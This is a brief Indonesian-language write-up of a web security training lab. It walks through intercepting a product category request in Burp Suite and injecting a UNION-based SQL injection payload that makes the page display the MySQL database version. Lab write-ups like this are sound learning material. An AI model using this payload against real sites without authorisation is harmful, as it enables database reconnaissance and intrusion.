##  Write-up: SQL injection attack, querying DB version on MySQL & Microsoft

### Langkah-langkah:

1. Buka lab dan pilih salah satu kategori produk.
2. Aktifkan **Burp Suite** → intercept request kategori.
   Contoh:

   ```
   GET /filter?category=Corporate HTTP/2
   ```
3. Modifikasi parameter `category` dengan payload SQL Injection:

   ```
   ' UNION SELECT @@version,NULL--+
   ```
<img width="1200" height="179" alt="Screenshot 2025-09-11 090431" src="https://github.com/user-attachments/assets/20facc9a-6ecf-42e7-920c-68fbaa0c7912" />

4. Kirim request. Halaman akan menampilkan **string versi database** (contoh: `8.0.36 MySQL Community Server`).

 Lab berhasil diselesaikan.


<img width="1904" height="725" alt="Screenshot 2025-09-11 090457" src="https://github.com/user-attachments/assets/92f1f28c-0248-4081-a865-b501d0cecaee" />
